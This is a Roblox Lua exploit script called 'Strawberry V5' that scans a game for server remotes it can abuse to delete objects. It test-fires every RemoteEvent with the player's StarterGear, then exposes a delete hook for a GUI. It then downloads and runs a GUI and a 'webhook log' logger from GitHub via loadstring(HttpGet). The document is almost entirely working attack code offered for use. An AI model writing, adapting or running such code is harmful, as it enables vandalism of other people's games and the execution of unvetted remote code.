--[[
⠀⠀⠀⠀⠀⢀⡀⠀⠀⠀⠀⠀⡄⠀⠀⠀⠀⢀⠀⠀
⠀⠀⠀⠀⠀⠀⣏⠓⠒⠤⣰⠋⠹⡄⠀⣠⠞⣿⠀⠀
⠀⠀⠀⢀⠄⠂⠙⢦⡀⠐⠨⣆⠁⣷⣮⠖⠋⠉⠁⠀
⠀⠀⡰⠁⠀⠮⠇⠀⣩⠶⠒⠾⣿⡯⡋⠩⡓⢦⣀⡀
⠀⡰⢰⡹⠀⠀⠲⣾⣁⣀⣤⠞⢧⡈⢊⢲⠶⠶⠛⠁
⢀⠃⠀⠀⠀⣌⡅⠀⢀⡀⠀⠀⣈⠻⠦⣤⣿⡀⠀⠀
⠸⣎⠇⠀⠀⡠⡄⠀⠷⠎⠀⠐⡶⠁⠀⠀⣟⡇⠀⠀
⡇⠀⡠⣄⠀⠷⠃⠀⠀⡤⠄⠀⠀⣔⡰⠀⢩⠇⠀⠀
⡇⠀⠻⠋⠀⢀⠤⠀⠈⠛⠁⠀⢀⠉⠁⣠⠏⠀⠀⠀
⣷⢰⢢⠀⠀⠘⠚⠀⢰⣂⠆⠰⢥⡡⠞⠁⠀⠀⠀⠀
⠸⣎⠋⢠⢢⠀⢠⢀⠀⠀⣠⠴⠋⠀⠀⠀⠀⠀⠀⠀
⠀⠘⠷⣬⣅⣀⣬⡷⠖⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠈⠁⠀

made by C:\Drive and Saji⠀⠀⠀

C:\Drive - Gui, Commands
Saji - Scanner
Abuses Delete Remotes
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
]]--

-- // V5 STRAWBERRY SCANNER
-- // rewrite by saji lolz
-- // my brain was completely destroyed while writing this (no sleep)
-- // chances are im the only one who can understand this alien coding style lol (I CAN, MUAHAHAHAHAHA)
-- // this version scans every remote and has a test
-- // which means theres a 99.99% chance it will detect the correct games

-- // this was Saji's pain and suffering, thanks dude - C:\Drive

local timer = 0; -- // times how long it takes to load the script
local backdoorfound = false; -- // this will turn to true or false depending on if vuln found
local vulnremote = nil; -- // if a remote with a vuln or backdoor is found it will be referenced in this variable

local safetime = 0.25; -- // lower will cause faster scan times but it will mess up more and have false positives
-- // higher numbers (like 0.25 which is the default) will take longer but be a good scanner
-- // 0.25 is the best for all situations and prob wont need to be changed

local scanninghint = Instance.new("Hint", workspace); -- // creates a hint to track scanner progress for the skids
scanninghint.Text = "STRAWBERRY V5: Scanning Game. Be patient. (Check F9 menu for progress) (Game might freeze for a bit)";

coroutine.wrap(function()
	repeat
		timer += 0.01;
		task.wait(0.01);
	until backdoorfound;
end)(); -- // creates a timer in a seperate thread so we can time the scanner

local deletebind = Instance.new("BindableEvent", game.Players.LocalPlayer);
deletebind.Name = "deletebind";
deletebind.Event:Connect(function(item)
	if backdoorfound == true then
		vulnremote:FireServer(item);
	end;
end); -- // creates a delete event with the backdoored remote so the gui can use it

local function remoteBackdoored(remote)
	local function testfire(item)
		pcall(function()
			remote:FireServer(item);			
		end);
	end;
	local function isDestroyed(obj)
		return obj == nil or obj.Parent == nil;
	end;
	local testpart = game.Players.LocalPlayer.StarterGear;
	testfire(testpart);
	task.wait(safetime); -- // slight delay to see if remote reacts
	print("STRAWBERRY V5: "..remote.Name.." /isbackdoored: "..tostring(isDestroyed(testpart)).." / "..remote:GetFullName());
	if isDestroyed(testpart) then
		vulnremote = remote;
		return true;
	end;
	return false;
end; -- // checks a remote event for a backdoor or vulnerability by firing it and seeing if it does something

local function scan()
	if backdoorfound then return end;
	for i, v in ipairs(game:GetDescendants()) do
		if v:IsA("RemoteEvent") then
			if not v.Parent then continue end;
			if v.Parent.Name == "RobloxReplicatedStorage" then continue end;
			if remoteBackdoored(v) == true then
				backdoorfound = true;
				print("found1!!?!?!");
				return; -- // backdoor found so breaks the loop
			else
				-- // keeps scanning if a backdoor isent found
			end; -- // tests remote for backdoor
		end;
	end;
end; -- // scans a place for vulnerable remotes

task.wait(2); -- // 2 sec delay before scanning to stop huge lag spike
scan(); -- // scans the WHOLE game for vuln/backdoored remotes
task.wait();
if backdoorfound then
	-- // loads up the gui and webhook log after backdoor/vuln is found :3
	loadstring(game:HttpGet("https://raw.githubusercontent.com/C-Dr1ve/Strawberry/refs/heads/main/UI_Source/v.5.50.lua"))();
	loadstring(game:HttpGet("https://raw.githubusercontent.com/C-Dr1ve/Strawberry/refs/heads/main/Loggers/log_v5.50.lua"))();
	scanninghint.Text = "STRAWBERRY V5: Backdoor found in "..tostring(timer).." seconds! (Backdoored Remote name: "..vulnremote.Name..")";
	task.wait(10);
	scanninghint:Destroy();
else
	scanninghint.Text = "STRAWBERRY V5: No backdoor found srry!";
	task.wait(10);
	scanninghint:Destroy();
end;
